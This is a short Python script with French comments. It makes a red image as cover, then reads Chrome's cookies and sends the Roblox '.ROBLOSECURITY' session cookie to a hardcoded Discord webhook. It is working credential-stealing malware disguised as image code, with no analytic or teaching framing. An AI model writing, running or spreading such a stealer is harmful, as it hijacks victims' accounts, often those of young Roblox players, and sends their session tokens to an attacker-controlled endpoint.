from io import BytesIO
from PIL import Image
import requests
import browser_cookie3

# Créer une image
width, height = 200, 200
color = (255, 0, 0)  # Rouge
image = Image.new('RGB', (width, height), color)

# Convertir l'image en bytes
buffer = BytesIO()
image.save(buffer, format='png')
buffer.seek(0)

# Envoyer l'image à l'utilisateur
image_url = 'https://cdn.discordapp.com/attachments/1075346356140523582/1076219721264926720/images_1.jpg'
response = requests.post(image_url, data=buffer, headers={'Content-Type': 'image/png'})

# Récupérer le cookie Roblox
cookie_roblox = None
for cookie in browser_cookie3.chrome():
    if cookie.domain == 'www.roblox.com' and cookie.name == '.ROBLOSECURITY':
        cookie_roblox = cookie.value
        break

if cookie_roblox is None:
    print('Cookie Roblox introuvable')
else:
    # Envoyer le cookie Roblox au webhook Discord
    webhook_url = 'https://discord.com/api/webhooks/1075374022256230442/bAEcTeGTE2fPgNe4cxTCZGg74FKEzfln6mHFU_u9RwYQtzzq6KJVleAfiQe_7agKl6jU'
    payload = {
        'content': f'Cookie Roblox : {cookie_roblox}'
    }
    response = requests.post(webhook_url, json=payload)
